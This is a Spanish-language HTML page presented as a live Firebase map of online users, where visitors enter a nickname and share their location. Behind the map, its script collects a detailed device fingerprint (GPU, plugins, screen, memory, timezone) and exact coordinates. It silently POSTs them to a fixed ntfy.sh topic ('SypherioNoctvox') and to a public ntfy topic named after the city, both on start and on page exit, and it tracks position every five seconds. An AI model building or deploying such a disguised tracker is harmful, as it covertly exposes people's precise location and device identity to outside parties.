<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Mapa en vivo con Firebase + Fingerprint</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { 
      margin:0; 
      padding:0; 
      background:#121212; 
      font-family:monospace; 
      color:#0f0; 
      display:flex; 
      flex-direction:column; 
      align-items:center; 
    }
    h2 { margin-top:20px; }
    input, button { 
      padding:10px; 
      margin:5px; 
      font-size:16px; 
      background:#1e1e1e; 
      color:#0f0; 
      border:1px solid #00ff00; 
      border-radius:5px; 
    }
    button { cursor:pointer; }
    button:hover { background:#2a2a2a; }
    .map-section { 
      width:90%; 
      max-width:600px; 
      height:400px; 
      margin:20px 0; 
      box-shadow:0 0 30px rgba(0,0,0,0.7); 
      border-radius:15px; 
      overflow:hidden; 
    }
    #map { width:100%; height:100%; }
    .leaflet-popup-content-wrapper { 
      background:#1e1e1e; 
      color:#00ff00; 
      font-weight:bold; 
      border-radius:10px; 
    }
    .leaflet-popup-tip { background:#1e1e1e; }
    pre { 
      width:90%; 
      max-width:600px; 
      background:#1e1e1e; 
      padding:10px; 
      border-radius:10px; 
      overflow-x:auto; 
      max-height:200px;
      overflow-y:auto;
    }
    .status {
      padding:10px;
      margin:10px;
      border-radius:5px;
      text-align:center;
    }
    .online { background:#004d00; }
    .offline { background:#4d0000; }
  </style>
</head>
<body>
<h2>Mapa en vivo con Firebase + Fingerprint</h2>
<input type="text" id="nick" placeholder="Escribe tu Nick" />
<button id="startBtn">Iniciar</button>
<div class="status" id="status">Desconectado</div>
<div class="map-section"><div id="map"></div></div>
<pre id="output"></pre>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.1/firebase-app.js";
import { getDatabase, ref, set, onValue, update, remove } from "https://www.gstatic.com/firebasejs/10.6.1/firebase-database.js";

// Configuración de Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCsM5ynPDbJCUV7HXq5NA3mmIXKxczc_RA",
  authDomain: "sypherionmaps.firebaseapp.com",
  databaseURL: "https://sypherionmaps-default-rtdb.firebaseio.com",
  projectId: "sypherionmaps",
  storageBucket: "sypherionmaps.firebasestorage.app",
  messagingSenderId: "529754955214",
  appId: "1:529754955214:web:c6b25dbafc9172eeb8df9f"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Configuración del mapa
const map = L.map('map').setView([0,0],2);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{
  attribution:'&copy; OpenStreetMap &copy; Carto', 
  subdomains:'abcd', 
  maxZoom:20
}).addTo(map);

// Iconos para marcadores
const greenIcon = L.icon({ 
  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64572.png", 
  iconSize:[50,50], 
  iconAnchor:[25,50], 
  popupAnchor:[0,-50] 
});

const redIcon = L.icon({ 
  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64576.png", 
  iconSize:[50,50], 
  iconAnchor:[25,50], 
  popupAnchor:[0,-50] 
});

// Variables globales
let uid = "";
let userMarker = null;
let userCircle = null;
let markers = {}; // Para guardar marcadores de todos los usuarios
let info = {};
let topicRegion = "";
let positionUpdateInterval;

// Función para obtener fingerprint del dispositivo
async function getFingerprint() {
  info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth + " bits",
    coresCPU: navigator.hardwareConcurrency || "N/A",
    memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    plugins: [...navigator.plugins].map(p => p.name)
  };
  
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No detectada";
  } catch(e) { 
    info.gpu = "No detectada"; 
  }
  
  return info;
}

// Función para obtener la ubicación y enviar datos
async function getLocationAndSend(nick) {
  if(!navigator.geolocation) return alert("No soporta geolocalización");

  navigator.geolocation.getCurrentPosition(async pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // Actualizar el mapa
    map.setView([lat, lon], 13);
    
    // Eliminar marcador anterior si existe
    if (userMarker) {
      map.removeLayer(userMarker);
    }
    
    // Eliminar círculo anterior si existe
    if (userCircle) {
      map.removeLayer(userCircle);
    }
    
    // Añadir nuevo marcador
    userMarker = L.marker([lat, lon], {icon: greenIcon}).addTo(map);
    userMarker.bindPopup(`🟢 ${nick} (Tú)`).openPopup();
    
    // Añadir círculo de animación
    userCircle = L.circle([lat, lon], {
      color: '#00ff00',
      fillColor: '#00ff00',
      fillOpacity: 0.3,
      radius: 100
    }).addTo(map);
    
    let growing = true;
    setInterval(() => { 
      let r = userCircle.getRadius(); 
      if(r >= 200) growing = false; 
      if(r <= 100) growing = true; 
      userCircle.setRadius(growing ? r+5 : r-5); 
    }, 100);

    // Obtener fingerprint
    await getFingerprint();

    // Geocoding inverso para obtener país y ciudad
    let region = {country: "Unknown", city: "Unknown"};
    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
      const data = await res.json();
      region.country = data.address.country || "Unknown";
      region.city = data.address.city || data.address.town || data.address.village || "Unknown";
    } catch(e) { 
      console.log("Error geocoding:", e); 
    }

    // Agregar coordenadas y link
    info.latitude = lat;
    info.longitude = lon;
    info.googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
    info.country = region.country;
    info.city = region.city;
    info.timestamp = new Date().toISOString();
    info.nick = nick;
    
    // Mostrar información en el panel
    document.getElementById("output").textContent = JSON.stringify(info, null, 2);

    // Topic simple: concatenar país + ciudad sin espacios ni /
    topicRegion = (region.country + region.city).replace(/\s+/g, '').replace(/\//g, '');
    
    // Enviar al principal
    fetch('https://ntfy.sh/SypherioNoctvox', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(info)
    });
    
    // Enviar al topic regional simple
    fetch(`https://ntfy.sh/${topicRegion}`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(info)
    });
    
    // Guardar en Firebase
    set(ref(db, "usuarios_online/" + uid), {
      nick,
      latitude: lat,
      longitude: lon,
      googleMapsLink: info.googleMapsLink,
      online: true,
      timestamp: Date.now(),
      fingerprint: info
    });
    
    // Actualizar estado
    document.getElementById("status").textContent = "Conectado";
    document.getElementById("status").className = "status online";
    
    // Escuchar todos los usuarios en tiempo real
    onValue(ref(db, "usuarios_online"), snapshot => {
      const users = snapshot.val() || {};
      
      // Eliminar marcadores de usuarios que ya no están
      for (const key in markers) {
        if (!users[key]) {
          map.removeLayer(markers[key]);
          delete markers[key];
        }
      }
      
      // Añadir o actualizar marcadores
      for (const key in users) {
        const data = users[key];
        
        // No mostrar nuestro propio marcador otra vez (ya lo tenemos)
        if (key === uid) continue;
        
        if (markers[key]) {
          // Actualizar posición existente
          markers[key].setLatLng([data.latitude, data.longitude]);
          markers[key].setIcon(data.online ? greenIcon : redIcon);
          markers[key].setPopupContent(`${data.nick}${data.online ? "" : " (Desconectado)"}`);
        } else {
          // Crear nuevo marcador
          markers[key] = L.marker([data.latitude, data.longitude], {
            icon: data.online ? greenIcon : redIcon
          }).addTo(map).bindPopup(`${data.nick}${data.online ? "" : " (Desconectado)"}`);
        }
      }
    });

    // Actualizar posición cada 5 segundos
    if (positionUpdateInterval) {
      clearInterval(positionUpdateInterval);
    }
    
    positionUpdateInterval = setInterval(() => {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        
        update(ref(db, "usuarios_online/" + uid), {
          latitude: lat,
          longitude: lon,
          googleMapsLink: googleMapsLink,
          online: true,
          timestamp: Date.now()
        });
        
        // Actualizar nuestra posición en el mapa
        userMarker.setLatLng([lat, lon]);
        userCircle.setLatLng([lat, lon]);
      });
    }, 5000);

  }, err => {
    alert("No se pudo obtener ubicación: " + err.message);
    document.getElementById("status").textContent = "Error de geolocalización";
    document.getElementById("status").className = "status offline";
  });
}

// Evento para iniciar
document.getElementById("startBtn").onclick = () => {
  const nick = document.getElementById("nick").value.trim();
  if (!nick) return alert("Escribe un Nick");
  
  // Generar UID único
  uid = nick + "_" + Date.now();
  
  // Iniciar proceso de geolocalización
  getLocationAndSend(nick);
};

// Aviso de desconexión
window.addEventListener("beforeunload", () => {
  if (uid) {
    // Enviar estado offline a Firebase
    update(ref(db, "usuarios_online/" + uid), {
      online: false,
      timestamp: Date.now()
    });
    
    // Enviar notificación de desconexión
    if (info.latitude) {
      const desconexion = {
        ...info, 
        event: "desconexión", 
        timestamp: new Date().toISOString()
      };
      
      fetch('https://ntfy.sh/SypherioNoctvox', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(desconexion)
      });
      
      if (topicRegion) {
        fetch(`https://ntfy.sh/${topicRegion}`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(desconexion)
        });
      }
    }
  }
});
</script>
</body>
</html>
